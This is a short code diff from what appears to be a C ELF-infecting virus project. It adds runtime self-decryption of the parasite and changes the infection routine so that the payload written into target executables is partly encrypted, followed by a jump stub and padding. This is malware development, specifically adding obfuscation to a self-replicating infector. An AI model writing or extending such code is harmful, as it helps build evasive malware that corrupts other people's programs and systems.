@@ -153,6 +153,7 @@ int do_main(void) {
 	if (process_runing()) {
 		return (1);
 	}
+	decrypter(get_eip() - ((char *)&yeah - (char *)&real_start));
 	main_encrypt();
 
 	return (0);
@@ -730,8 +731,8 @@ new_file(char buf[], size_t size, size_t end_of_text, const char *path, Elf64_Ad
 	size_wrote += write(fd, (char *) (&value), sizeof(size_t));
 	value = parasite_size - 7 - (address_of_start_encrypt - address_of_start);
 	size_wrote += write(fd, (char *) (&value), sizeof(size_t));
-	size_wrote += write(fd, (char *) address_of_start,
-	                    parasite_size /**(address_of_start_encrypt - address_of_start)**/);
+	size_wrote += write(fd, (char *) address_of_start, (address_of_start_encrypt - address_of_start));
+	size_wrote += crypter((char *)address_of_start_encrypt, parasite_size - 7 - (address_of_start_encrypt - address_of_start) , (address_of_start_encrypt - address_of_start), fd);
 	size_wrote += write(fd, jmp_code, 9);
 	for (long unsigned int i = 0; i < PAGE_SIZE * 2 - size_wrote; i++)
 		write(fd, "\0", 1);
